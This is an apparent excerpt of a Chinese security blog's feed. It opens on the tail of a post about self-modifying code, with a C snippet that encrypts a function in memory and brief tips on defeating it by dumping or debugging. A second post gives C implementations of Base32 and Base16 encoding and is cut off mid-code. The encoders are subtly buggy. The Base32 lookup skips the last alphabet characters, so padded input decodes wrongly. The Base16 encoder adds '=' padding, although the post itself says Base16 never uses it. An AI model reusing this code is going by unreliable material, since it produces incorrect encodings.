class="keyword">void</span> <span class="title">ck</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"this is a test of smc"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加密数据结束的地址</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">end</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> *lp_s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *lp_e = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">lp_s = (<span class="keyword">char</span> *)ck;  <span class="comment">//获取需要加密函数的起始地址</span></span><br><span class="line">lp_e = (<span class="keyword">char</span> *)end;  <span class="comment">//获取需要加密函数的结束地址</span></span><br><span class="line">len = lp_e - lp_s;</span><br><span class="line">enc(lp_s, len);      <span class="comment">//smc加密函数</span></span><br><span class="line">ck();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解密SMC"><a href="#解密SMC" class="headerlink" title="解密SMC"></a>解密SMC</h2><ol><li>找到smc的加密函数，当运行完成smc解密函数时,将程序dump下来。</li><li>smc对程序动态完全没有用，可以用OD来调试程序，找到受保护代码。</li></ol><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="http://www.hexblog.com/?p=9" target="_blank" rel="noopener">http://www.hexblog.com/?p=9</a><br><a href="http://www.voidcn.com/article/p-etaovjqz-bao.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-etaovjqz-bao.html</a><br><a href="http://www.uml.org.cn/c++/200710313.asp" target="_blank" rel="noopener">http://www.uml.org.cn/c++/200710313.asp</a><br><a href="https://esebanana.github.io/2018/04/08/re_10_tls_smc/" target="_blank" rel="noopener">https://esebanana.github.io/2018/04/08/re_10_tls_smc/</a><br><a href="http://www.voidcn.com/article/p-etaovjqz-bao.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-etaovjqz-bao.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;main函数前有什么？&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>C语言实现Base32和Base16解密加密算法</title>
    <link href="https://qianfei11.github.io/2018/12/04/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0Base32%E5%92%8CBase16%E8%A7%A3%E5%AF%86%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://qianfei11.github.io/2018/12/04/C语言实现Base32和Base16解密加密算法/</id>
    <published>2018-12-04T14:04:09.000Z</published>
    <updated>2018-12-05T08:15:28.195Z</updated>
    
    <content type="html"><![CDATA[<p>承接之前<a href="https://qianfei11.github.io/2018/05/12/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0base64%E8%A7%A3%E5%AF%86%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/">Base64的文章</a>，实现了一下Base32和Base16，原理是一样的。</p><a id="more"></a><h1 id="Base32加解密实现"><a href="#Base32加解密实现" class="headerlink" title="Base32加解密实现"></a>Base32加解密实现</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *base32payload = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567="</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_pos</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(c == base32payload[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base32_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> sign = len % <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> res_len = len % <span class="number">5</span> ? ((len) / <span class="number">5</span> + <span class="number">1</span>) * <span class="number">8</span> : (len) / <span class="number">5</span> * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len; i += <span class="number">5</span>, j += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i + <span class="number">4</span> &gt;= len) &#123;</span><br><span class="line">            res[j] = (s[i] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">            <span class="keyword">if</span>(sign == <span class="number">1</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = (s[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x1C</span>;</span><br><span class="line">                res[j + <span class="number">2</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">4</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x20</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sign == <span class="number">2</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = ((s[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x1C</span>) | ((s[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x18</span>);</span><br><span class="line">                res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = (s[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">4</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x20</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sign == <span class="number">3</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = ((s[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x1C</span>) | ((s[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x18</span>);</span><br><span class="line">                res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = ((s[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x10</span>) | ((s[i + <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>);</span><br><span class="line">                res[j + <span class="number">4</span>] = (s[i + <span class="number">2</span>] &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x1E</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x20</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x20</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sign == <span class="number">4</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = ((s[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x1C</span>) | ((s[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x18</span>);</span><br><span class="line">                res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = ((s[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x10</span>) | ((s[i + <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>);</span><br><span class="line">                res[j + <span class="number">4</span>] = ((s[i + <span class="number">2</span>] &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x1E</span>) | ((s[i + <span class="number">3</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x10</span>);</span><br><span class="line">                res[j + <span class="number">5</span>] = (s[i + <span class="number">3</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = (s[i + <span class="number">3</span>] &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0x18</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x20</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res[j] = (s[i] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">        res[j + <span class="number">1</span>] = ((s[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x1C</span>) | ((s[i + <span class="number">1</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x03</span>);</span><br><span class="line">        res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">        res[j + <span class="number">3</span>] = ((s[i + <span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x10</span>) | ((s[i + <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>);</span><br><span class="line">        res[j + <span class="number">4</span>] = ((s[i + <span class="number">2</span>] &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x1E</span>) | ((s[i + <span class="number">3</span>] &gt;&gt; <span class="number">3</span>) &amp; <span class="number">0x10</span>);</span><br><span class="line">        res[j + <span class="number">5</span>] = (s[i + <span class="number">3</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x1F</span>;</span><br><span class="line">        res[j + <span class="number">6</span>] = ((s[i + <span class="number">3</span>] &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0x18</span>) | ((s[i + <span class="number">4</span>] &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x07</span>);</span><br><span class="line">        res[j + <span class="number">7</span>] = s[i + <span class="number">4</span>] &amp; <span class="number">0x1F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; res_len; j++) &#123;</span><br><span class="line">        res[j] = base32payload[res[j]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base32_decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> res_len = len / <span class="number">8</span> * <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> count = len / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> s_index = i * <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">int</span> res_index = i * <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">int</span> buffer[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">int</span> sign = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            buffer[j] = find_pos(s[s_index + j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i == count - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(buffer[j] == <span class="number">0x20</span>) &#123;</span><br><span class="line">                    sign++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index] = ((buffer[<span class="number">0</span>] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">3</span>) | ((buffer[<span class="number">1</span>] &amp; <span class="number">0x1C</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">1</span>] = ((buffer[<span class="number">1</span>] &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">6</span>) | ((buffer[<span class="number">2</span>] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">1</span>) | ((buffer[<span class="number">3</span>] &amp; <span class="number">0x10</span>) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">2</span>] = ((buffer[<span class="number">3</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | ((buffer[<span class="number">4</span>] &amp; <span class="number">0x1E</span>) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">3</span>] = ((buffer[<span class="number">4</span>] &amp; <span class="number">0x01</span>) &lt;&lt; <span class="number">7</span>) | ((buffer[<span class="number">5</span>] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">2</span>) | ((buffer[<span class="number">6</span>] &amp; <span class="number">0x18</span>) &gt;&gt; <span class="number">3</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">4</span>] = ((buffer[<span class="number">6</span>] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>) | (buffer[<span class="number">7</span>] &amp; <span class="number">0x1F</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s1[MAX];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s1);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *s2 = base32_encode((<span class="keyword">const</span> <span class="keyword">char</span> *)s1, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s2);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *s3 = base32_decode((<span class="keyword">const</span> <span class="keyword">char</span> *)s2, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s3);</span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="built_in">free</span>(s3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Base16加解密实现"><a href="#Base16加解密实现" class="headerlink" title="Base16加解密实现"></a>Base16加解密实现</h1><p>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。Base16先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制，在下述表格中找到对应的编码串接起来就是Base16编码。可以看到8比特数据按照4比特切分刚好是两组，所以Base16不可能用到填充符号“=”。</p><p>简单来说，Base16编码是一个标准的十六进制字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *base16payload = <span class="string">"0123456789ABCDEF="</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_pos</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(c == base16payload[i]) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base16_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> sign = len % <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> res_len = len * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; len; i += <span class="number">4</span>, j += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(i + <span class="number">4</span> &gt;= len) &#123;</span><br><span class="line">            res[j] = (s[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">            <span class="keyword">if</span>(sign == <span class="number">1</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = s[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">2</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">4</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x10</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sign == <span class="number">2</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = s[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = s[i + <span class="number">1</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">4</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x10</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sign == <span class="number">3</span>) &#123;</span><br><span class="line">                res[j + <span class="number">1</span>] = s[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">3</span>] = s[i + <span class="number">1</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">4</span>] = (s[i + <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">5</span>] = s[i + <span class="number">2</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">                res[j + <span class="number">6</span>] = <span class="number">0x10</span>;</span><br><span class="line">                res[j + <span class="number">7</span>] = <span class="number">0x10</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res[j] = (s[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">1</span>] = s[i] &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">2</span>] = (s[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">3</span>] = s[i + <span class="number">1</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">4</span>] = (s[i + <span class="number">2</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">5</span>] = s[i + <span 